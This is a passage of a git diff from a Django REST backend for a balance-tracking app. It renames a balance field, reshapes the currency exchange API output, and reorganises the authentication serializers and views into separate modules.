        return {\n             'gross_quantity': 1.1,\n-            'net_quantity': 2.2,\n+            'expected_quantity': 2.2,\n             'coin_type': self.coin_type,\n             'owner': self.user,\n             'year': now().date().year\n@@ -60,7 +60,7 @@ def get_annual_balance_data(self):\n     def get_monthly_balance_data(self):\n         return {\n             'gross_quantity': 1.1,\n-            'net_quantity': 2.2,\n+            'expected_quantity': 2.2,\n             'coin_type': self.coin_type,\n             'owner': self.user,\n             'year': now().date().year,\n@@ -83,7 +83,7 @@ def authenticate_add_annual_balance(self):\n         data = self.get_annual_balance_data()\n         AnnualBalance.objects.create(\n             gross_quantity=data['gross_quantity'],\n-            net_quantity=data['net_quantity'],\n+            expected_quantity=data['expected_quantity'],\n             coin_type=data['coin_type'],\n             owner=data['owner'],\n             year=data['year'],\n@@ -94,7 +94,7 @@ def authenticate_add_monthly_balance(self):\n         data = self.get_monthly_balance_data()\n         MonthlyBalance.objects.create(\n             gross_quantity=data['gross_quantity'],\n-            net_quantity=data['net_quantity'],\n+            expected_quantity=data['expected_quantity'],\n             coin_type=data['coin_type'],\n             owner=data['owner'],\n             year=data['year'],\n@@ -156,33 +156,33 @@ def test_monthly_balance_filter_gross_quantity_min_and_max(self):\n         data = dict(response.data)\n         self.assertEqual(data['count'], 0)\n     \n-    def test_annual_balance_filter_net_quantity_min_and_max(self):\n+    def test_annual_balance_filter_expected_quantity_min_and_max(self):\n         \"\"\"\n-        Checks AnnualBalance filter by net_quantity min and max\n+        Checks AnnualBalance filter by expected_quantity min and max\n         \"\"\"\n         self.authenticate_add_annual_balance()\n-        url = self.annual_balance_list+'?net_quantity_min=1.0&net_quantity_max=3.0'\n+        url = self.annual_balance_list+'?expected_quantity_min=1.0&expected_quantity_max=3.0'\n         response = self.get(url)\n         self.assertEqual(response.status_code, status.HTTP_200_OK)\n         data = dict(response.data)\n         self.assertEqual(data['count'], 1)\n-        url = self.annual_balance_list+'?net_quantity_min=6.0&net_quantity_max=8.0'\n+        url = self.annual_balance_list+'?expected_quantity_min=6.0&expected_quantity_max=8.0'\n         response = self.get(url)\n         self.assertEqual(response.status_code, status.HTTP_200_OK)\n         data = dict(response.data)\n         self.assertEqual(data['count'], 0)\n \n-    def test_monthly_balance_filter_net_quantity_min_and_max(self):\n+    def test_monthly_balance_filter_expected_quantity_min_and_max(self):\n         \"\"\" \n-        Checks MonthlyBalance filter by net_quantity min and max\n+        Checks MonthlyBalance filter by expected_quantity min and max\n         \"\"\"\n         self.authenticate_add_monthly_balance()\n-        url = self.monthly_balance_list+'?net_quantity_min=1.0&net_quantity_max=3.0'\n+        url = self.monthly_balance_list+'?expected_quantity_min=1.0&expected_quantity_max=3.0'\n         response = self.get(url)\n         self.assertEqual(response.status_code, status.HTTP_200_OK)\n         data = dict(response.data)\n         self.assertEqual(data['count'], 1)\n-        url = self.monthly_balance_list+'?net_quantity_min=6.0&net_quantity_max=8.0'\n+        url = self.monthly_balance_list+'?expected_quantity_min=6.0&expected_quantity_max=8.0'\n         response = self.get(url)\n         self.assertEqual(response.status_code, status.HTTP_200_OK)\n         data = dict(response.data)\ndiff --git a\/backend\/djangorest\/balance\/tests\/test_pagination.py b\/backend\/djangorest\/balance\/tests\/test_pagination.py\nindex b57f906..663a000 100644\n--- a\/backend\/djangorest\/balance\/tests\/test_pagination.py\n+++ b\/backend\/djangorest\/balance\/tests\/test_pagination.py\n@@ -49,7 +49,7 @@ def authenticate_user(self, credentials):\n     def get_annual_balance_data(self):\n         return {\n             'gross_quantity': 1.1,\n-            'net_quantity': 2.2,\n+            'expected_quantity': 2.2,\n             'coin_type': self.coin_type,\n             'owner': self.user,\n             'year': now().date().year\n@@ -58,7 +58,7 @@ def get_annual_balance_data(self):\n     def get_monthly_balance_data(self):\n         return {\n             'gross_quantity': 1.1,\n-            'net_quantity': 2.2,\n+            'expected_quantity': 2.2,\n             'coin_type': self.coin_type,\n             'owner': self.user,\n             'year': now().date().year,\n@@ -84,7 +84,7 @@ def add_annual_balance(self):\n         data = self.get_annual_balance_data()\n         AnnualBalance.objects.create(\n             gross_quantity=data['gross_quantity'],\n-            net_quantity=data['net_quantity'],\n+            expected_quantity=data['expected_quantity'],\n             coin_type=data['coin_type'],\n             owner=data['owner'],\n             year=data['year'],\n@@ -98,7 +98,7 @@ def add_monthly_balance(self):\n         data = self.get_monthly_balance_data()\n         MonthlyBalance.objects.create(\n             gross_quantity=data['gross_quantity'],\n-            net_quantity=data['net_quantity'],\n+            expected_quantity=data['expected_quantity'],\n             coin_type=data['coin_type'],\n             owner=data['owner'],\n             year=data['year'],\n@@ -126,7 +126,7 @@ def test_annual_balance_pagination_scheme(self):\n             'results': [\n                 {\n                     'gross_quantity': 1.1, \n-                    'net_quantity': 2.2,\n+                    'expected_quantity': 2.2,\n                     'coin_type': 'EUR',\n                     'year': now().date().year\n                 }\n@@ -174,7 +174,7 @@ def test_monthly_balance_pagination_scheme(self):\n             'results': [\n                 {\n                     'gross_quantity': 1.1, \n-                    'net_quantity': 2.2,\n+                    'expected_quantity': 2.2,\n                     'coin_type': 'EUR',\n                     'year': now().date().year,\n                     'month': now().date().month\ndiff --git a\/backend\/djangorest\/balance\/tests\/test_permission.py b\/backend\/djangorest\/balance\/tests\/test_permission.py\nindex 1d3431b..a129c5e 100644\n--- a\/backend\/djangorest\/balance\/tests\/test_permission.py\n+++ b\/backend\/djangorest\/balance\/tests\/test_permission.py\n@@ -82,7 +82,7 @@ def authenticate_user(self, credentials):\n     def get_annual_balance_data(self, user):\n         return {\n             'gross_quantity': 1.1,\n-            'net_quantity': 2.2,\n+            'expected_quantity': 2.2,\n             'coin_type': self.coin_type,\n             'owner': user,\n             'year': now().date().year\n@@ -91,7 +91,7 @@ def get_annual_balance_data(self, user):\n     def get_monthly_balance_data(self, user):\n         return {\n             'gross_quantity': 1.1,\n-            'net_quantity': 2.2,\n+            'expected_quantity': 2.2,\n             'coin_type': self.coin_type,\n             'owner': user,\n             'year': now().date().year,\n@@ -102,7 +102,7 @@ def add_annual_balance(self, user):\n         data = self.get_annual_balance_data(user)\n         return AnnualBalance.objects.create(\n             gross_quantity=data['gross_quantity'],\n-            net_quantity=data['net_quantity'],\n+            expected_quantity=data['expected_quantity'],\n             coin_type=data['coin_type'],\n             owner=data['owner'],\n             year=data['year'],\n@@ -112,7 +112,7 @@ def add_monthly_balance(self, user):\n         data = self.get_monthly_balance_data(user)\n         return MonthlyBalance.objects.create(\n             gross_quantity=data['gross_quantity'],\n-            net_quantity=data['net_quantity'],\n+            expected_quantity=data['expected_quantity'],\n             coin_type=data['coin_type'],\n             owner=data['owner'],\n             year=data['year'],\ndiff --git a\/backend\/djangorest\/balance\/utils.py b\/backend\/djangorest\/balance\/utils.py\nindex 09c58c6..133ebf2 100644\n--- a\/backend\/djangorest\/balance\/utils.py\n+++ b\/backend\/djangorest\/balance\/utils.py\n@@ -73,8 +73,8 @@ def update_or_create_annual_balance(converted_quantity, owner,\n     # Update extra fields\n     if (is_revenue): annual_balance.gross_quantity += converted_quantity\n     else: annual_balance.gross_quantity -= converted_quantity\n-    annual_balance.net_quantity = owner.expected_annual_balance \\\n-        - annual_balance.gross_quantity\n+    annual_balance.gross_quantity = round(annual_balance.gross_quantity, 2)\n+    annual_balance.expected_quantity = round(owner.expected_annual_balance, 2)\n     annual_balance.save()\n \n \n@@ -102,6 +102,6 @@ def update_or_create_monthly_balance(converted_quantity, owner,\n     # Update extra fields\n     if (is_revenue): monthly_balance.gross_quantity += converted_quantity\n     else: monthly_balance.gross_quantity -= converted_quantity\n-    monthly_balance.net_quantity = owner.expected_monthly_balance \\\n-        - monthly_balance.gross_quantity\n+    monthly_balance.gross_quantity = round(monthly_balance.gross_quantity, 2)\n+    monthly_balance.expected_quantity = round(owner.expected_monthly_balance,2)\n     monthly_balance.save()\n\\ No newline at end of file\ndiff --git a\/backend\/djangorest\/coin\/api\/views.py b\/backend\/djangorest\/coin\/api\/views.py\nindex 1fee0e3..6f6f3dc 100644\n--- a\/backend\/djangorest\/coin\/api\/views.py\n+++ b\/backend\/djangorest\/coin\/api\/views.py\n@@ -54,7 +54,15 @@ def get(self, request, code, format=None):\n                     status=status.HTTP_400_BAD_REQUEST\n                 )\n             return Response(\n-                data={\"coin_exchange\": json_data[code]},\n+                data={\n+                    \"code\": code,\n+                    \"exchanges\": [\n+                        { \n+                            \"code\": exchange,\n+                            \"value\": json_data[code][exchange]\n+                        } for exchange in json_data[code].keys()\n+                    ]\n+                },\n             )\n         return Response(\n             data={\"detail\": _(\"No exchange data, try later\")},\n@@ -65,17 +73,29 @@ class CoinExchangeListView(APIView):\n     permission_classes = (IsAuthenticated,)\n     \n     def get(self, request, days, format=None):\n-        if days < 1: return Response(data={})\n+        if days < 1: return Response(data=[])\n         if days > 30: days = 30\n         data = CoinExchange.objects.filter(\n             created__lte=timezone.now(), \n             created__gt=timezone.now() - timezone.timedelta(days=days)\n         )\n         return Response(\n-            data=[\n-                {\n-                    'echange': json.loads(x.exchange_data), \n-                    'date': x.created.date()\n-                } for x in data\n-            ]\n+            data={\n+                \"date_exchanges\": [\n+                    {\n+                        'exchanges': [\n+                            {\n+                                \"code\": code,\n+                                \"exchanges\": [\n+                                    { \n+                                        \"code\": exchange,\n+                                        \"value\": json.loads(x.exchange_data)[code][exchange]\n+                                    } for exchange in json.loads(x.exchange_data)[code].keys()\n+                                ]\n+                            } for code in json.loads(x.exchange_data).keys()\n+                        ], \n+                        'date': x.created.date()\n+                    } for x in data\n+                ]\n+            }\n         )\n\\ No newline at end of file\ndiff --git a\/backend\/djangorest\/coin\/migrations\/0001_initial.py b\/backend\/djangorest\/coin\/migrations\/0001_initial.py\nindex 4f8d481..b8d4c13 100644\n--- a\/backend\/djangorest\/coin\/migrations\/0001_initial.py\n+++ b\/backend\/djangorest\/coin\/migrations\/0001_initial.py\n@@ -1,4 +1,4 @@\n-# Generated by Django 4.0.7 on 2022-10-22 21:39\n+# Generated by Django 4.0.8 on 2022-12-08 11:56\n \n from django.db import migrations, models\n import uuid\ndiff --git a\/backend\/djangorest\/custom_auth\/api\/serializers\/jwt_code_serializers.py b\/backend\/djangorest\/custom_auth\/api\/serializers\/code_serializers.py\nsimilarity index 52%\nrename from backend\/djangorest\/custom_auth\/api\/serializers\/jwt_code_serializers.py\nrename to backend\/djangorest\/custom_auth\/api\/serializers\/code_serializers.py\nindex 37d526b..78dfe0b 100644\n--- a\/backend\/djangorest\/custom_auth\/api\/serializers\/jwt_code_serializers.py\n+++ b\/backend\/djangorest\/custom_auth\/api\/serializers\/code_serializers.py\n@@ -1,58 +1,13 @@\n-import os\n from rest_framework import serializers\n-from rest_framework_simplejwt.serializers import TokenObtainPairSerializer\n-from custom_auth.models import User\n-from custom_auth.api.serializers.utils import check_user_with_email\n-from custom_auth.tasks import send_email_code\n+from django.utils.translation import get_language\n from django.utils.timezone import now\n from django.conf import settings\n+from custom_auth.api.serializers.utils import check_user_with_email\n+from custom_auth.models import User\n+from django.contrib.auth.password_validation import validate_password\n from django.utils.translation import gettext_lazy as _\n-from django.utils.translation import get_language\n-from rest_framework_simplejwt.serializers import TokenRefreshSerializer\n-from rest_framework_simplejwt.state import token_backend\n-from django.contrib.auth import get_user_model\n-\n-\n-class CustomTokenObtainPairSerializer(TokenObtainPairSerializer):\n-\n-    @classmethod\n-    def get_token(cls, user):\n-        if not user.inv_code:\n-            raise serializers.ValidationError(\n-                {\"inv_code\": _(\"No invitation code stored\")})\n-        if not user.verified:\n-            raise serializers.ValidationError(\n-                {\"verified\": _(\"Unverified email\")})\n-        token = super(CustomTokenObtainPairSerializer, cls).get_token(user)\n-        # Custom keys added in PAYLOAD\n-        token['username'] = user.username\n-        token['email'] = user.email\n-        return token\n-\n-class CustomTokenRefreshSerializer(TokenRefreshSerializer):\n-    \"\"\"\n-    Inherit from `TokenRefreshSerializer` and touch the database\n-    before re-issuing a new access token and ensure that the user\n-    exists and is active.\n-    \"\"\"\n-\n-    error_msg = _('No active account found with the given credentials')\n-\n-    def validate(self, attrs):\n-        try:\n-            token_payload = token_backend.decode(attrs['refresh'])\n-        except:\n-            raise serializers.ValidationError(\n-                {\"inavlid_token\": _('Invalid refresh token')})\n-        try:\n-            user = get_user_model().objects.get(pk=token_payload['user_id'])\n-        except get_user_model().DoesNotExist:\n-            raise serializers.ValidationError(\n-                {\"no_active_account\": self.error_msg})\n-        if not user.is_active:\n-            raise serializers.ValidationError(\n-                {\"no_active_account\": self.error_msg})\n-        return super().validate(attrs)\n+from custom_auth.tasks import send_email_code\n+import os\n \n \n class CodeSerializer(serializers.Serializer):\n@@ -118,3 +73,75 @@ def create(self, validated_data):\n         user.verified = True\n         user.save()\n         return validated_data\n+\n+class ResetPasswordStartSerializer(serializers.Serializer):\n+    \"\"\"\n+    Serializer for password reset (code creation)\n+    \"\"\"\n+    email = serializers.EmailField(required=True)\n+    \n+    def validate_email(self, email):\n+        try:\n+            User.objects.get(email=email)\n+        except:\n+            raise serializers.ValidationError(_(\"User not found\"))\n+        return email\n+\n+    def validate(self, data):\n+        user = User.objects.get(email=data['email'])\n+        if user.date_pass_reset:\n+            duration_s = (now() - user.date_pass_reset).total_seconds()\n+            if duration_s < settings.EMAIL_CODE_THRESHOLD :\n+                raise serializers.ValidationError(\n+                    {\"code\": _(\"Code has already been sent, wait {} seconds\")\n+                        .format(str(settings.EMAIL_CODE_THRESHOLD-duration_s))})\n+        return data\n+\n+class ResetPasswordVerifySerializer(serializers.Serializer):\n+    \"\"\"\n+    Serializer for password reset (code verification)\n+    \"\"\"\n+    email = serializers.EmailField(required=True)\n+    code = serializers.CharField(\n+        required=True, \n+        min_length=6, max_length=6\n+    )\n+    new_password = serializers.CharField(\n+        required=True,\n+        validators=[validate_password]\n+    )\n+    \n+    def validate_email(self, email):\n+        try:\n+            User.objects.get(email=email)\n+        except:\n+            raise serializers.ValidationError(_(\"User not found\"))\n+        return email\n+\n+    def validate(self, data):\n+        user = User.objects.get(email=data[\"email\"])\n+        code = data[\"code\"]\n+        if not user.date_pass_reset:\n+            raise serializers.ValidationError({\"code\", _(\"No code sent\")})\n+        if user.date_pass_reset:\n+            duration_s = (now() - user.date_pass_reset).total_seconds()\n+            if duration_s > settings.EMAIL_CODE_VALID :\n+                raise serializers.ValidationError(\n+                    {\"code\": _(\"Code is no longer valid\")})\n+        if user.pass_reset != code :\n+            raise serializers.ValidationError(\n+                {\"code\": _(\"Invalid code\")})\n+        return data\n+\n+class ChangePasswordSerializer(serializers.Serializer):\n+    \"\"\"\n+    Serializer for password change (needs old password)\n+    \"\"\"\n+    old_password = serializers.CharField(\n+        required=True,\n+        #validators=[validate_password]\n+    )\n+    new_password = serializers.CharField(\n+        required=True,\n+        validators=[validate_password]\n+    )\n\\ No newline at end of file\ndiff --git a\/backend\/djangorest\/custom_auth\/api\/serializers\/jwt_serializers.py b\/backend\/djangorest\/custom_auth\/api\/serializers\/jwt_serializers.py\nnew file mode 100644\nindex 0000000..9ef57d7\n--- \/dev\/null\n+++ b\/backend\/djangorest\/custom_auth\/api\/serializers\/jwt_serializers.py\n@@ -0,0 +1,48 @@\n+from rest_framework import serializers\n+from rest_framework_simplejwt.serializers import TokenObtainPairSerializer\n+from django.utils.translation import gettext_lazy as _\n+from rest_framework_simplejwt.serializers import TokenRefreshSerializer\n+from rest_framework_simplejwt.state import token_backend\n+from django.contrib.auth import get_user_model\n+\n+\n+class CustomTokenObtainPairSerializer(TokenObtainPairSerializer):\n+\n+    @classmethod\n+    def get_token(cls, user):\n+        if not user.inv_code:\n+            raise serializers.ValidationError(\n+                {\"inv_code\": _(\"No invitation code stored\")})\n+        if not user.verified:\n+            raise serializers.ValidationError(\n+                {\"verified\": _(\"Unverified email\")})\n+        token = super(CustomTokenObtainPairSerializer, cls).get_token(user)\n+        # Custom keys added in PAYLOAD\n+        token['username'] = user.username\n+        token['email'] = user.email\n+        return token\n+\n+class CustomTokenRefreshSerializer(TokenRefreshSerializer):\n+    \"\"\"\n+    Inherit from `TokenRefreshSerializer` and touch the database\n+    before re-issuing a new access token and ensure that the user\n+    exists and is active.\n+    \"\"\"\n+\n+    error_msg = _('No active account found with the given credentials')\n+\n+    def validate(self, attrs):\n+        try:\n+            token_payload = token_backend.decode(attrs['refresh'])\n+        except:\n+            raise serializers.ValidationError(\n+                {\"inavlid_token\": _('Invalid refresh token')})\n+        try:\n+            user = get_user_model().objects.get(pk=token_payload['user_id'])\n+        except get_user_model().DoesNotExist:\n+            raise serializers.ValidationError(\n+                {\"no_active_account\": self.error_msg})\n+        if not user.is_active:\n+            raise serializers.ValidationError(\n+                {\"no_active_account\": self.error_msg})\n+        return super().validate(attrs)\n\\ No newline at end of file\ndiff --git a\/backend\/djangorest\/custom_auth\/api\/serializers\/user_serializers.py b\/backend\/djangorest\/custom_auth\/api\/serializers\/user_serializers.py\nindex 57aa857..0eb290c 100644\n--- a\/backend\/djangorest\/custom_auth\/api\/serializers\/user_serializers.py\n+++ b\/backend\/djangorest\/custom_auth\/api\/serializers\/user_serializers.py\n@@ -3,25 +3,11 @@\n from rest_framework.validators import UniqueValidator\n from django.contrib.auth.password_validation import validate_password\n from django.db import transaction\n-from django.utils.timezone import now\n-from django.conf import settings\n from django.utils.translation import gettext_lazy as _\n from django.utils.translation import check_for_language\n from django.core.exceptions import ValidationError\n \n \n-@transaction.atomic()\n-def decrease_inv_code_usage(code):\n-    \"\"\"\n-    Race condition at usage left update in an InvitationCode\n-    \"\"\"\n-    sid = transaction.savepoint()\n-    inv_code = code\n-    inv_code.usage_left -= 1\n-    if inv_code.usage_left <= 0: inv_code.is_active = False\n-    inv_code.save()\n-    transaction.savepoint_commit(sid)\n-\n def check_inv_code(code):\n     \"\"\"\n     Checks if an invitation code is created and valid\n@@ -50,7 +36,8 @@ class UserCreationSerializer(serializers.ModelSerializer):\n     Serializer for User creation (register)\n     \"\"\"\n     username = serializers.CharField(\n-        required=True, max_length=15,\n+        required=True,\n+        max_length=15,\n         validators=[UniqueValidator(queryset=User.objects.all())]\n     )\n     email = serializers.EmailField(\n@@ -59,12 +46,14 @@ class UserCreationSerializer(serializers.ModelSerializer):\n     )\n     inv_code = serializers.SlugRelatedField(\n         required=True, \n-        slug_field=\"code\", many=False,\n+        slug_field=\"code\",\n+        many=False,\n         queryset=InvitationCode.objects.all()\n     )\n     password = serializers.CharField(\n         required=True, \n         write_only=True,\n+        max_length=30,\n         validators=[validate_password]\n     )\n     password2 = serializers.CharField(\n@@ -77,6 +66,8 @@ class Meta:\n         fields = [\n             'username',\n             'email',\n+            'expected_annual_balance', # not required\n+            'expected_monthly_balance', # not required\n             'language',\n             'inv_code',\n             'pref_coin_type',\n@@ -118,7 +109,15 @@ def create(self, validated_data):\n             language=language\n         )\n         user.set_password(validated_data['password'])\n-        decrease_inv_code_usage(inv_code)\n+        # Invitation code decrease, race condition\n+        inv_codes = InvitationCode.objects.select_for_update().filter(code=inv_code.code)\n+        with transaction.atomic():\n+            for inv_code in inv_codes:\n+                inv_code.usage_left = inv_code.usage_left - 1\n+                if inv_code.usage_left <= 0: inv_code.is_active = False\n+                inv_code.save()\n+        # Alternative:\n+        # inv_code.usage_left = F('usage_left') - 1\n         user.save()\n         return user\n \n@@ -152,77 +151,4 @@ class Meta:\n         ]\n         read_only_fields = [\n             'last_login'\n-        ]\n-\n-\n-class ChangePasswordSerializer(serializers.Serializer):\n-    \"\"\"\n-    Serializer for password change (needs old password)\n-    \"\"\"\n-    old_password = serializers.CharField(\n-        required=True,\n-        #validators=[validate_password]\n-    )\n-    new_password = serializers.CharField(\n-        required=True,\n-        validators=[validate_password]\n-    )\n-\n-class ResetPasswordStartSerializer(serializers.Serializer):\n-    \"\"\"\n-    Serializer for password reset (code creation)\n-    \"\"\"\n-    email = serializers.EmailField(required=True)\n-    \n-    def validate_email(self, email):\n-        try:\n-            User.objects.get(email=email)\n-        except:\n-            raise serializers.ValidationError(_(\"User not found\"))\n-        return email\n-\n-    def validate(self, data):\n-        user = User.objects.get(email=data['email'])\n-        if user.date_pass_reset:\n-            duration_s = (now() - user.date_pass_reset).total_seconds()\n-            if duration_s < settings.EMAIL_CODE_THRESHOLD :\n-                raise serializers.ValidationError(\n-                    {\"code\": _(\"Code has already been sent, wait {} seconds\")\n-                        .format(str(settings.EMAIL_CODE_THRESHOLD-duration_s))})\n-        return data\n-\n-class ResetPasswordVerifySerializer(serializers.Serializer):\n-    \"\"\"\n-    Serializer for password reset (code verification)\n-    \"\"\"\n-    email = serializers.EmailField(required=True)\n-    code = serializers.CharField(\n-        required=True, \n-        min_length=6, max_length=6\n-    )\n-    new_password = serializers.CharField(\n-        required=True,\n-        validators=[validate_password]\n-    )\n-    \n-    def validate_email(self, email):\n-        try:\n-            User.objects.get(email=email)\n-        except:\n-            raise serializers.ValidationError(_(\"User not found\"))\n-        return email\n-\n-    def validate(self, data):\n-        user = User.objects.get(email=data[\"email\"])\n-        code = data[\"code\"]\n-        if not user.date_pass_reset:\n-            raise serializers.ValidationError({\"code\", _(\"No code sent\")})\n-        if user.date_pass_reset:\n-            duration_s = (now() - user.date_pass_reset).total_seconds()\n-            if duration_s > settings.EMAIL_CODE_VALID :\n-                raise serializers.ValidationError(\n-                    {\"code\": _(\"Code is no longer valid\")})\n-        if user.pass_reset != code :\n-            raise serializers.ValidationError(\n-                {\"code\": _(\"Invalid code\")})\n-        return data\n\\ No newline at end of file\n+        ]\n\\ No newline at end of file\ndiff --git a\/backend\/djangorest\/custom_auth\/api\/urls.py b\/backend\/djangorest\/custom_auth\/api\/urls.py\nindex 34a6b92..113a176 100644\n--- a\/backend\/djangorest\/custom_auth\/api\/urls.py\n+++ b\/backend\/djangorest\/custom_auth\/api\/urls.py\n@@ -1,12 +1,16 @@\n from django.urls import path\n-from custom_auth.api.views import (\n-    ChangePasswordView,\n-    CodeVerificationView, \n-    CodeView, \n+from custom_auth.api.views.jwt_views import (\n     CustomTokenObtainPairView,\n     CustomTokenRefreshView,\n+)\n+from custom_auth.api.views.code_views import (\n+    ChangePasswordView,\n+    CodeVerificationView, \n+    CodeView,\n     ResetPasswordStartView,\n-    ResetPasswordVerifyView, \n+    ResetPasswordVerifyView,\n+)\n+from custom_auth.api.views.user_views import (\n     UserCreationView, \n     UserRetrieveUpdateDestroyView\n )\ndiff --git a\/backend\/djangorest\/custom_auth\/api\/views\/__init__.py b\/backend\/djangorest\/custom_auth\/api\/views\/__init__.py\nnew file mode 100644\nindex 0000000..e69de29\ndiff --git a\/backend\/djangorest\/custom_auth\/api\/views.py b\/backend\/djangorest\/custom_auth\/api\/views\/code_views.py\nsimilarity index 51%\nrename from backend\/djangorest\/custom_auth\/api\/views.py\nrename to backend\/djangorest\/custom_auth\/api\/views\/code_views.py\nindex 679842b..f9874e0 100644\n--- a\/backend\/djangorest\/custom_auth\/api\/views.py\n+++ b\/backend\/djangorest\/custom_auth\/api\/views\/code_views.py\n@@ -1,72 +1,22 @@\n import os\n-from coin.currency_converter_integration import convert_or_fetch\n from core.permissions import IsCurrentVerifiedUser\n from custom_auth.models import User\n-from custom_auth.api.serializers.jwt_code_serializers import (\n-    CodeSerializer, \n-    CodeVerificationSerializer, \n-    CustomTokenObtainPairSerializer, \n-    CustomTokenRefreshSerializer\n-)\n from rest_framework import generics, status, mixins\n-from rest_framework.parsers import FormParser, MultiPartParser, JSONParser\n+from rest_framework.parsers import JSONParser\n from rest_framework.permissions import AllowAny\n from rest_framework.response import Response\n-from rest_framework_simplejwt.views import TokenObtainPairView, TokenRefreshView\n-from custom_auth.api.serializers.user_serializers import (\n+from custom_auth.api.serializers.code_serializers import (\n+    CodeSerializer, \n+    CodeVerificationSerializer,\n     ChangePasswordSerializer,\n     ResetPasswordStartSerializer,\n     ResetPasswordVerifySerializer,\n-    UserCreationSerializer,\n-    UserRetrieveUpdateDestroySerializer\n )\n from custom_auth.tasks import send_password_code\n from django.utils.timezone import now\n from django.utils.translation import gettext_lazy as _\n from django.utils.translation import get_language\n \n-class UserCreationView(generics.CreateAPIView):\n-    queryset = User.objects.all()\n-    permission_classes = (AllowAny,)\n-    serializer_class = UserCreationSerializer\n-    parser_classes = (FormParser, JSONParser,)\n-\n-class UserRetrieveUpdateDestroyView(generics.RetrieveUpdateDestroyAPIView):\n-    queryset = User.objects.all()\n-    permission_classes = (IsCurrentVerifiedUser,)\n-    serializer_class = UserRetrieveUpdateDestroySerializer\n-    parser_classes = (MultiPartParser, FormParser, JSONParser)\n-    \n-    def get_object(self, queryset=None):\n-        return self.request.user\n-    \n-    def perform_update(self, serializer):\n-        if 'email' in serializer.validated_data:\n-            serializer.validated_data['verified'] = False\n-        # The user balance should only be converted if\n-        # the same balance is provided in the request\n-        # and the pref_coin_type is changed, same for\n-        # expected_annual_balance and expected_monthly_balance\n-        if 'pref_coin_type' in serializer.validated_data:\n-            if 'balance' in serializer.validated_data:\n-                serializer.validated_data['balance'] = convert_or_fetch(\n-                    serializer.instance.pref_coin_type, \n-                    serializer.validated_data['pref_coin_type'],\n-                    serializer.validated_data['balance']\n-                )\n-            if 'expected_annual_balance' in serializer.validated_data:\n-                serializer.validated_data['expected_annual_balance'] = convert_or_fetch(\n-                    serializer.instance.pref_coin_type, \n-                    serializer.validated_data['pref_coin_type'],\n-                    serializer.validated_data['expected_annual_balance']\n-                )\n-            if 'expected_monthly_balance' in serializer.validated_data:\n-                serializer.validated_data['expected_monthly_balance'] = convert_or_fetch(\n-                    serializer.instance.pref_coin_type, \n-                    serializer.validated_data['pref_coin_type'],\n-                    serializer.validated_data['expected_monthly_balance']\n-                )\n-        serializer.save()\n \n class CodeView(generics.CreateAPIView):\n     permission_classes = (AllowAny,)\n@@ -78,17 +28,6 @@ class CodeVerificationView(generics.CreateAPIView):\n     serializer_class = CodeVerificationSerializer\n     parser_classes = (JSONParser,)\n \n-class CustomTokenObtainPairView(TokenObtainPairView):\n-    permission_classes = (AllowAny,)\n-    serializer_class = CustomTokenObtainPairSerializer\n-    parser_classes = (JSONParser,)\n-\n-class CustomTokenRefreshView(TokenRefreshView):\n-    \"\"\"\n-    Refresh token generator view.\n-    \"\"\"\n-    serializer_class = CustomTokenRefreshSerializer\n-\n class ChangePasswordView(generics.CreateAPIView): \n     \"\"\"\n     An endpoint for changing password\ndiff --git a\/backend\/djangorest\/custom_auth\/api\/views\/jwt_views.py b\/backend\/djangorest\/custom_auth\/api\/views\/jwt_views.py\nnew file mode 100644\nindex 0000000..32e6a6c\n--- \/dev\/null\n+++ b\/backend\/djangorest\/custom_auth\/api\/views\/jwt_views.py\n@@ -0,0 +1,19 @@\n+from custom_auth.api.serializers.jwt_serializers import (\n+    CustomTokenObtainPairSerializer, \n+    CustomTokenRefreshSerializer\n+)\n+from rest_framework.parsers import JSONParser\n+from rest_framework.permissions import AllowAny\n+from rest_framework_simplejwt.views import TokenObtainPairView, TokenRefreshView\n+\n+\n+class CustomTokenObtainPairView(TokenObtainPairView):\n+    permission_classes = (AllowAny,)\n+    serializer_class = CustomTokenObtainPairSerializer\n+    parser_classes = (JSONParser,)\n+\n+class CustomTokenRefreshView(TokenRefreshView):\n+    \"\"\"\n+    Refresh token generator view.\n+    \"\"\"\n+    serializer_class = CustomTokenRefreshSerializer\ndiff --git a\/backend\/djangorest\/custom_auth\/api\/views\/user_views.py b\/backend\/djangorest\/custom_auth\/api\/views\/user_views.py\nnew file mode 100644\nindex 0000000..f7a2edd\n--- \/dev\/null\n+++ b\/backend\/djangorest\/custom_auth\/api\/views\/user_views.py\n@@ -0,0 +1,54 @@\n+from coin.currency_converter_integration import convert_or_fetch\n+from core.permissions import IsCurrentVerifiedUser\n+from custom_auth.models import User\n+from rest_framework import generics\n+from rest_framework.parsers import FormParser, MultiPartParser, JSONParser\n+from rest_framework.permissions import AllowAny\n+from custom_auth.api.serializers.user_serializers import (\n+    UserCreationSerializer,\n+    UserRetrieveUpdateDestroySerializer\n+)\n+from django.utils.translation import gettext_lazy as _\n+\n+class UserCreationView(generics.CreateAPIView):\n+    queryset = User.objects.all()\n+    permission_classes = (AllowAny,)\n+    serializer_class = UserCreationSerializer\n+    parser_classes = (FormParser, JSONParser,)\n+\n+class UserRetrieveUpdateDestroyView(generics.RetrieveUpdateDestroyAPIView):\n+    queryset = User.objects.all()\n+    permission_classes = (IsCurrentVerifiedUser,)\n+    serializer_class = UserRetrieveUpdateDestroySerializer\n+    parser_classes = (MultiPartParser, FormParser, JSONParser)\n+    \n+    def get_object(self, queryset=None):\n+        return self.request.user\n+    \n+    def perform_update(self, serializer):\n+        if 'email' in serializer.validated_data:\n+            serializer.validated_data['verified'] = False\n+        # The user balance should only be converted if\n+        # the same balance is provided in the request\n+        # and the pref_coin_type is changed, same for\n+        # expected_annual_balance and expected_monthly_balance\n+        if 'pref_coin_type' in serializer.validated_data:\n+            if 'balance' in serializer.validated_data:\n+                serializer.validated_data['balance'] = convert_or_fetch(\n+                    serializer.instance.pref_coin_type, \n+                    serializer.validated_data['pref_coin_type'],\n+                    serializer.validated_data['balance']\n+                )\n+            if 'expected_annual_balance' in serializer.validated_data:\n+                serializer.validated_data['expected_annual_balance'] = convert_or_fetch(\n+                    serializer.instance.pref_coin_type, \n+                    serializer.validated_data['pref_coin_type'],\n+                    serializer.validated_data['expected_annual_balance']\n+                )\n+            if 'expected_monthly_balance' in serializer.validated_data:\n+                serializer.validated_data['expected_monthly_balance'] = convert_or_fetch(\n+                    serializer.instance.pref_coin_type, \n+                    serializer.validated_data['pref_coin_type'],\n+                    serializer.validated_data['expected_monthly_balance']\n+                )\n+        serializer.save()\n\\ No newline at end of file\ndiff --git a\/backend\/djangorest\/custom_auth\/migrations\/0001_initial.py 